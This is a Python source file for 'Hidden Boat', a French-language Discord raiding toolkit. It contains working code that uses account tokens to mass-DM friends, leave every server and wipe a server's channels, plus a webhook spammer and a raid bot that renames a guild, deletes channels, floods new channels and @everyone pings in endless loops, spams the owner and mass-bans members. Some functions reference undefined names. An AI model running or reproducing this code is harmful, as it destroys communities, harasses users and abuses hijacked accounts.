import os
import asyncio
import discord
from discord.ext import commands
import json
import requests
import subprocess
import time
from threading import Thread
from pystyle import Colors, Colorate, Center

ascii_art = r'''
                            █████   █████ █████ ██████████   ██████████   ██████████ ██████   █████            
                           ░░███   ░░███ ░░███ ░░███░░░░███ ░░███░░░░███ ░░███░░░░░█░░██████ ░░███ 
                            ░███    ░███  ░███  ░███   ░░███ ░███   ░░███ ░███  █ ░  ░███░███ ░███            
                            ░███████████  ░███  ░███    ░███ ░███    ░███ ░██████    ░███░░███░███            
                            ░███░░░░░███  ░███  ░███    ░███ ░███    ░███ ░███░░█    ░███ ░░██████           
                            ░███    ░███  ░███  ░███    ███  ░███    ███  ░███ ░   █ ░███  ░░█████           
                            █████   █████ █████ ██████████   ██████████   ██████████ █████  ░░█████          
                           ░░░░░   ░░░░░ ░░░░░ ░░░░░░░░░░   ░░░░░░░░░░   ░░░░░░░░░░ ░░░░░    ░░░░░           
'''

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def display_menu():
    clear_screen()
    colored_ascii_art = Colorate.Horizontal(Colors.white_to_green, ascii_art, 1)
    print(Center.XCenter(colored_ascii_art))
    menu_options = f"""
                                                        {Colorate.Horizontal(Colors.white_to_green, "[1]", 1)} OSINT Tools
                                                        {Colorate.Horizontal(Colors.white_to_green, "[2]", 1)} Discord Tools
                                                        {Colorate.Horizontal(Colors.white_to_green, "[3]", 1)} Exit
    
"""
    print(Center.XCenter(menu_options))
    option_prompt = Colorate.Horizontal(Colors.white_to_green, "Entrez l’option ici : ", 1)
    print(Center.XCenter(option_prompt), end="")


def run_osint_tools():
    while True:
        clear_screen()
        colored_ascii_art = Colorate.Horizontal(Colors.white_to_green, ascii_art, 1)
        print(Center.XCenter(colored_ascii_art))
        menu_options = f"""
                                                        {Colorate.Horizontal(Colors.white_to_green, "[1]", 1)} IP Lookup
                                                        {Colorate.Horizontal(Colors.white_to_green, "[2]", 1)} Database
                                                        {Colorate.Horizontal(Colors.white_to_green, "[4]", 1)} Back to main menu
    
"""
        print(Center.XCenter(menu_options))
        option_prompt = Colorate.Horizontal(Colors.white_to_green, "Entrez l’option ici : ", 1)
        print(Center.XCenter(option_prompt), end="")

        option = input().strip()
        
        if option == '1':
            ip_address = input(Colorate.Horizontal(Colors.white_to_green, "Saisir l’adresse IP à rechercher : ", 1)).strip()
            ip_lookup(ip_address)
            
        elif option == '2':
            try:
                subprocess.run(['python', 'Tools/databasechercheur.py'])
            except FileNotFoundError:
                print("Not Found")
        elif option == '3':
            pass
        elif option == '4':
            break
        else:
            print("Option non valide. Veuillez saisir une option valide.")

def ip_lookup(ip_address):
    map_ascii = """
                                                                                                             
                                @@@@@@@@    @@@-                         #             ..                           
                       @%+  @@ %%:++* :+#@@#+:+                            #  ...      ##           ....            
                       @@@      @@% @++:::::::=@@        @=                ...###.    ...... ......:####-:#.        
     :@@@@@@       @@@      @@      @#+:::::::-@       .@            #    .##*=:#:#=:##:. ##########+::-*##.        
    @ *::::+%@ .+   ##%- @@@:         #:::::::+:                   ##   .  #-:::++***++###=-::::::::::::- :         
     %+::::::+*%@@@+ **@@ @  @@@      @+::::::%                    #.  #:# :-::::::::::::::::::::::::+++-##         
  @@#+:::::::::=  +=* +   @: @ -@@     *:::::+@            ...    .#... .*#=-:::::::::::::::::::::::+#:###.         
  %+#@#%%*-::::=%@%-==+*@@@-.   %@    :*-*%@@@           .#####  #::###*+-+:::::::::::::::::::::+####: =:.          
  @@      %+::::=  -:::+@  ##  @@    *@*%:              .###+#.. ####+*..=+::::::::::::::::::::-#:....##            
           #::::=**-:::#     @@       @@                ##.#######++++**..:::::::::::::::::::::-.:    .##           
           @::::::::++=#     #+#@                     ####:.:#+++++++++**.::::::::::::---::::::-+#:    ..           
           @+:::::::  =+#@. %=::+@                .#... -# ##*----=++****.::::::::...:- -::::::::=#.                
            +:::::::++===*++=:=*%@@               #.#.+###@#@@@@@@@++*....:::::*=:#@@:---::::::::-#:#.              
           @-....:::.::= =::-*%                    .###*#**==*##@#*###.:::::::::::...:::::::::::+#+.+#              
           %.@.@@.:-:@.--%:+%:                     . ####.#*##... *#::++::::::::::::::::::::-+###:...               
           @@.:::.#=@@.@.@-#                      ###::-:.###.###=**##-+::::::::::::::::::::- .:##  #-              
            @+-::::....:-*@                      .:-- ...:.::::---...-=+::::::::::::::::::::-*..                    
              %+::+#@@*%@                       ...........-....##=::=*##*=--::::::::::::::::-#.                    
               @+:#                            :.................:#+:=.--+-###+-::-+#*=:::+####.                    
                @%@   . =@                    ....................-#+=####....*+:+##: #*+:#:...                     
                  +@@@                        .........@@..@@@@@...-####.     .###:  .+:#=#    #                    
                      @    %                  ..............@....... -..       .#      .#:#.                        
                         =%##%@@@=             .:...::.................                ..#....   *                  
                        -#-:::::-*@              ...  .:.............:                  #.  ###.                    
                        @*::::::::+#@@@@                :..........-.                       ...-#    @@@@           
                         @+:::::::::::+@                :..........:                                     @          
                          @#+:::::::::#                 :..........:..:                            @@  @            
                            #:::::::+#@                 .........-..:..                         @%#*#%%%@           
                            @::::::+@                    .........  ..                       %@@-.@ . .:#@          
                            @:::::+@                      .....:.                            *@@@@%@@@@-@%@         
                            @:::=#@                        ..:.                              @#*#- #*=.:#@          
                            @=+#@                                                                    @@@@           
                             *#                                                                                    
                             %@                                                                       @            
                             @@                                                                                 
                              %:                                                                                        
                                                                                                                                                                                                                                          
    """
    colored_map_ascii = Colorate.Horizontal(Colors.white_to_green, map_ascii, 1)
    print(colored_map_ascii)

    url = f"https://ipinfo.io/{ip_address}/json"
    response = requests.get(url)

    if response.status_code == 200:
        data = response.json()
        ip_info = f"""
IP Address: {data['ip']}
Hostname: {data.get('hostname', 'N/A')}
City: {data.get('city', 'N/A')}
Region: {data.get('region', 'N/A')}
Country: {data.get('country', 'N/A')}
Location: {data.get('loc', 'N/A')}
Organization: {data.get('org', 'N/A')}
"""
        colored_ip_info = Colorate.Horizontal(Colors.white_to_green, ip_info, 1)
        print(colored_ip_info)
    else:
        print(f"Failed to lookup IP: {ip_address}. Status code: {response.status_code}")

    input("\nPress Enter to continue...")

def join_server_with_token(token, invite_code):
    url = f"https://discord.com/api/v9/invites/{invite_code}"
    headers = {
        "Authorization": token,
        "Content-Type": "application/json"
    }
    response = requests.post(url, headers=headers)
    
    if response.status_code == 200:
        print(f"Successfully joined the server with invite code: {invite_code}")
    else:
        print(f"Failed to join the server. Status code: {response.status_code}")    

def leave_server(server_id, token):
    try:
        result = requests.delete(f"https://discord.com/api/v9/users/@me/guilds/{server_id}",
                                 headers={"Authorization": token})
        if result.status_code == 204:
            print(f"Left server {server_id} with token {token}")
        else:
            print(f"Failed to leave server {server_id} with token {token}. Status code: {result.status_code}")
    except Exception as e:
        print(f"Error leaving server {server_id} with token {token}: {str(e)}")
            
def select_webhook_mode():
    while True:
        clear_screen()
        colored_ascii_art = Colorate.Horizontal(Colors.white_to_green, ascii_art, 1)
        print(Center.XCenter(colored_ascii_art))
        print(Center.XCenter(credits))
        print(Center.XCenter("Webhook Spammer"))
        
        menu_options = f"""
                                                        {Colorate.Horizontal(Colors.white_to_green, "[1]", 1)} Webhook unique
                                                        {Colorate.Horizontal(Colors.white_to_green, "[2]", 1)} Plusieurs Webhooks de 'webhook.txt'
"""
        print(Center.XCenter(menu_options))
        
        mode = input(Colorate.Horizontal(Colors.white_to_green, "Entrez votre choix (1 ou 2) : ", 1)).strip()
        
        if mode == '1':
            webhook_url = input(Colorate.Horizontal(Colors.white_to_green, "Enter Webhook URL: ", 1)).strip()
            return [webhook_url]
        elif mode == '2':
            webhook_file = os.path.join(os.path.dirname(__file__), 'webhook.txt')
            if os.path.isfile(webhook_file):
                with open(webhook_file, 'r') as f:
                    webhook_urls = [line.strip() for line in f.readlines()]
                if not webhook_urls:
                    print("Aucun webhooks trouvé dans webhook.txt.")
                    open_file_command = "start webhook.txt" if os.name == "nt" else "xdg-open webhook.txt"
                    os.system(open_file_command)
                    input("\nPress Enter to continue...")
                else:
                    return webhook_urls
            else:
                print("webhook.txt not found.")
                input("\nPress Enter to continue...")
        else:
            print("Option non valide. Veuillez saisir une option valide.")

def webhook_spammer():
    webhook_urls = select_webhook_mode()
    if not webhook_urls:
        return
    
    message = input(Colorate.Horizontal(Colors.white_to_green, "Entrez le message dans Spam : ", 1)).strip()
    count = int(input(Colorate.Horizontal(Colors.white_to_green, "Entrez le nombre de fois où envoyer par webhook : ", 1)).strip())

    for webhook_url in webhook_urls:
        for _ in range(count):
            payload = {"content": message}
            headers = {"Content-Type": "application/json"}
            response = requests.post(webhook_url, json=payload, headers=headers)

    input("\nPress Enter to continue...")
    
def delete_channel(token, channel_id):
    url = f"https://discord.com/api/v9/channels/{channel_id}"
    headers = {
        "Authorization": token,
        "Content-Type": "application/json"
    }
    response = requests.delete(url, headers=headers)
    
    if response.status_code == 200:
        print(Colorate.Horizontal(Colors.white_to_green, f"Canal supprimé avec ID : {channel_id}", 1))
    else:
        print(Colorate.Horizontal(Colors.red_to_white, f"Échec de la suppression du canal {channel_id}. Status code: {response.status_code} - {response.text}", 1))

def create_channel(token, server_id, channel_name):
    url = f"https://discord.com/api/v9/guilds/{server_id}/channels"
    headers = {
        "Authorization": token,
        "Content-Type": "application/json"
    }
    data = {
        "name": channel_name,
        "type": 0
    }
    response = requests.post(url, headers=headers, data=json.dumps(data))
    
    if response.status_code == 201:
        print(Colorate.Horizontal(Colors.white_to_green, f"Canal créé avec nom : {channel_name}", 1))
    elif response.status_code == 429:
        retry_after = response.json().get("retry_after", 1)
        print(Colorate.Horizontal(Colors.red_to_white, f"Taux limité. Retrying après {retry_after} seconds...", 1))
        time.sleep(retry_after)
        create_channel(token, server_id, channel_name)
    else:
        print(Colorate.Horizontal(Colors.red_to_white, f"Échec de création du canal {channel_name}. Status code: {response.status_code} - {response.text}", 1))

def raidwithme(token, server_id):
    url = f"https://discord.com/api/v9/guilds/{server_id}/channels"
    headers = {
        "Authorization": token,
        "Content-Type": "application/json"
    }
    response = requests.get(url, headers=headers)
    
    if response.status_code == 200:
        channels = response.json()
        for channel in channels:
            delete_channel(token, channel['id'])
        
        print(Colorate.Horizontal(Colors.white_to_green, "Tous les canaux supprimés avec succès!", 1))
        
        num_channels = int(input(Colorate.Horizontal(Colors.white_to_green, "Saisir le nombre de canaux à créer : ", 1)).strip())
        channel_base_name = input(Colorate.Horizontal(Colors.white_to_green, "Saisir le nom de base des canaux : ", 1)).strip()
        
        for i in range(num_channels):
            channel_name = f"{channel_base_name}-{i+1}"
            create_channel(token, server_id, channel_name)
        
        print(Colorate.Horizontal(Colors.white_to_green, "Opération terminée avec succès!", 1))
    else:
        print(Colorate.Horizontal(Colors.red_to_white, f"Impossible de récupérer les canaux. Code d’état : {response.status_code} - {response.text}", 1))

    input(Colorate.Horizontal(Colors.white_to_green, "Press Enter to continue...", 1))
    
def token_dm_all(token, message):
    url = "https://discord.com/api/v9/users/@me/relationships"
    headers = {
        "Authorization": token,
        "Content-Type": "application/json"
    }
    response = requests.get(url, headers=headers)
    
    if response.status_code == 200:
        friends = response.json()
        for friend in friends:
            friend_id = friend['id']
            dm_url = f"https://discord.com/api/v9/users/@me/channels"
            payload = {"recipient_id": friend_id}
            dm_response = requests.post(dm_url, headers=headers, data=json.dumps(payload))
            if dm_response.status_code == 200:
                dm_channel_id = dm_response.json()['id']
                message_url = f"https://discord.com/api/v9/channels/{dm_channel_id}/messages"
                message_payload = {"content": message}
                send_message_response = requests.post(message_url, headers=headers, data=json.dumps(message_payload))
                if send_message_response.status_code == 200:
                    print(Colorate.Horizontal(Colors.white_to_green, f"message envoyé à {friend['user']['username']}", 1))
                else:
                    print(Colorate.Horizontal(Colors.red_to_white, f"Failed to send message to {friend['user']['username']}. Status code: {send_message_response.status_code} - {send_message_response.text}", 1))
            else:
                print(Colorate.Horizontal(Colors.red_to_white, f"Échec de l’ouverture de DM avec {friend['user']['username']}. Status code: {dm_response.status_code} - {dm_response.text}", 1))
    else:
        print(Colorate.Horizontal(Colors.red_to_white, f"Impossible de récupérer la liste d’amis. Code d’état : {response.status_code} - {response.text}", 1))

def token_destroyer(token):
    url = "https://discord.com/api/v9/users/@me/guilds"
    headers = {
        "Authorization": token,
        "Content-Type": "application/json"
    }
    response = requests.get(url, headers=headers)

    if response.status_code == 200:
        servers = response.json()
        for server in servers:
            leave_server(server['id'], token)
    else:
        print(Colorate.Horizontal(Colors.red_to_white, f"Impossible de récupérer la liste du serveur. Code d’état : {response.status_code} - {response.text}", 1))

    change_language_to_chinese(token)
    
async def bot_dm_all(bot, message):
    for guild in bot.guilds:
        for member in guild.members:
            if not member.bot:
                try:
                    await member.send(message)
                    print(Colorate.Horizontal(Colors.white_to_green, f"Message envoyé à {member.name}", 1))
                except Exception as e:
                    print(Colorate.Horizontal(Colors.red_to_white, f"Échec de l'envoi du message à {member.name}: {e}", 1))
                    
def bot_raid():
    def token_bot():
        token = input(Colorate.Horizontal(Colors.white_to_green, "Enter token: ", 1)).strip()

        intents = discord.Intents.all()
        bot = commands.Bot(command_prefix='+', intents=intents)

        bot.remove_command("help")

        @bot.event
        async def on_ready():
            print(f"Bot {bot.user} has connected.")
            activity = discord.Streaming(name="Hidden Boat", url="https://twitch.tv/hiddenboat")
            await bot.change_presence(activity=activity)

        @bot.command()
        async def help(ctx):
            embed = discord.Embed(title="HIDDEN BOTRAID Commandes", description="Liste des commandes :", color=0x000000)
            embed.add_field(name="`+hidden`", value="Nukes tout les server", inline=False)
            embed.add_field(name="`+rolespam`", value="Crée des rôles", inline=False)
            embed.add_field(name="`+ownerspam`", value="DM le propriétaire du serveur avec un message de nuke.", inline=False)
            embed.add_field(name="`+massban`", value="Bannit tous les membres du serveur.", inline=False)
            embed.add_field(name="`+kickban`", value="Bannit et bots tous les membres du serveur.", inline=False)
            embed.set_footer(text="discord.gg/hentail")
            embed.set_image(url="https://i.pinimg.com/originals/c6/fb/94/c6fb94ee41fb968e27ad009047f0a4cb.gif")
            await ctx.send(embed=embed)

        @bot.command()
        async def hidden(ctx):
            await ctx.message.delete()
            await ctx.guild.edit(name="NUKED BY HIDDEN BOAT")
            
            async def delete_channel(channel):
                try:
                    await channel.delete()
                    print('deleted {}'.format(channel))
                except:
                    print('cant delete {}'.format(channel))
            
            delete_tasks = [delete_channel(channel) for channel in ctx.guild.channels]
            await asyncio.gather(*delete_tasks)
            
            while True:
                await ctx.guild.create_text_channel("HIDDEN BOAT")

        @bot.event
        async def on_guild_channel_create(channel):
            while True:
                await channel.send("@here @everyone @everyone @here nuked by Hidden Boat discord.gg/hentail")

        @bot.command()
        async def rolespam(ctx):
            await ctx.message.delete()
            for i in range(100):
                await ctx.guild.create_role(name="hidden boat")

        @bot.command()
        async def ownerspam(ctx):
            owner = ctx.guild.owner
            while True:
                await owner.send("VOTRE SERV A ÉTÉ DESTROY PAR HIDDEN BOAT discord.gg/hentail")

        @bot.command()
        async def massban(ctx):
            try:
                for members in ctx.guild.members:
                    await members.ban(reason="NUKED BY HIDDEN BOAT")
                    print(" ban {members}")
            except:
                print("cant ban {members}")

        @bot.command()
        async def kickban(ctx):
            try:
                for members in ctx.guild.members:
                    await members.ban(reason="NUKED BY HIDDEN BOAT")
                    print(" kicked {members}")
            except:
                print("cant kick {members}")

        bot.run(token)

    if __name__ == "__main__":
        token_bot()


def run_discord_tools():
    while True:
        clear_screen()
        colored_ascii_art = Colorate.Horizontal(Colors.white_to_green, ascii_art, 1)
        print(Center.XCenter(colored_ascii_art))
        menu_options = f"""
                                                        {Colorate.Horizontal(Colors.white_to_green, "[1]", 1)} Token Dm All
                                                        {Colorate.Horizontal(Colors.white_to_green, "[2]", 1)} Token Leaver
                                                        {Colorate.Horizontal(Colors.white_to_green, "[3]", 1)} Token Destroyer
                                                        {Colorate.Horizontal(Colors.white_to_green, "[4]", 1)} Im Raid Bot
                                                        {Colorate.Horizontal(Colors.white_to_green, "[5]", 1)} Webhook Spammer
                                                        {Colorate.Horizontal(Colors.white_to_green, "[6]", 1)} Bot Dm All
                                                        {Colorate.Horizontal(Colors.white_to_green, "[7]", 1)} Bot Nuke
                                                        {Colorate.Horizontal(Colors.white_to_green, "[8]", 1)} Back to main menu
"""
        print(Center.XCenter(menu_options))
        option_prompt = Colorate.Horizontal(Colors.white_to_green, "Entrez l’option ici :", 1)
        print(Center.XCenter(option_prompt), end="")

        option = input().strip()

        if option == '8':
            break
        elif option == '1':
            token = input(Colorate.Horizontal(Colors.white_to_green, "Enter token: ", 1)).strip()
            message = input(Colorate.Horizontal(Colors.white_to_green, "Enter message: ", 1)).strip()
            token_dm_all(token, message)
        elif option == '2':
            server_id = input(Colorate.Horizontal(Colors.white_to_green, "Enter server id: ", 1)).strip()
            token = input(Colorate.Horizontal(Colors.white_to_green, "Enter token: ", 1)).strip()
            leave_server(server_id, token)
        elif option == '3':
            token = input(Colorate.Horizontal(Colors.white_to_green, "Enter token: ", 1)).strip()
            token_destroyer(token)
        elif option == '4':
            server_id = input(Colorate.Horizontal(Colors.white_to_green, "Enter server id: ", 1)).strip()
            token = input(Colorate.Horizontal(Colors.white_to_green, "Enter token: ", 1)).strip()
            raidwithme(token, server_id)
        elif option == '5':
            webhook_spammer()
        elif option == '6':
            token = input(Colorate.Horizontal(Colors.white_to_green, "Enter bot token: ", 1)).strip()
            message = input(Colorate.Horizontal(Colors.white_to_green, "Enter message: ", 1)).strip()
            
            intents = discord.Intents.default()
            intents.members = True

            bot = commands.Bot(command_prefix="!", intents=intents)
            
            @bot.event
            async def on_ready():
                print(Colorate.Horizontal(Colors.white_to_green, f'Bot connecté en tant que {bot.user}', 1))
                await bot_dm_all(bot, message)
                await bot.close()
            bot.run(token)
        elif option == '7':
             bot_raid()



def main():
    while True:
        display_menu()
        action = input().strip()

        if action == '1':
            run_osint_tools()
        elif action == '2':
            run_discord_tools()
        elif action == '3':
            print("HiddenBoat...")
            time.sleep(2)
            break
        else:
            print("Option non valide. Veuillez saisir une option valide.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nHiddenBoat...")
